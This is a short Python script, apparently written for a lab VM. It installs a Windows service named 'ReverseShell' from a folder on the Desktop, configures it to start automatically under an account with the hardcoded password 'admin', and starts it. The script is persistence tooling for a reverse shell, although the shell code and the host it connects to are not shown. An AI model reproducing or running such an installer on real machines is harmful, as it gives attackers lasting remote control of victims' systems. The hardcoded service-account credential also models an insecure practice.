import subprocess
import os


def main():
    # Change directory to 'Desktop'.
    os.chdir(os.path.join(os.environ["HOMEPATH"], "Desktop"))
    os.chdir("Reverse-Shell")
    cmd = "python service.py install"
    subprocess.call(cmd, shell=True)
    cmd = "python service.py update"
    subprocess.call(cmd, shell=True)
    cmd = "sc config ReverseShell start=auto"
    subprocess.call(cmd, shell=True)
    # This command is only needed in my windows server 2016 VM.
    cmd = r"sc config ReverseShell obj= WINDEV1911EVAL\User password= admin type= own"
    subprocess.call(cmd, shell=True)
    cmd = "net start ReverseShell"
    subprocess.call(cmd, shell=True)


if __name__ == '__main__':
    main()
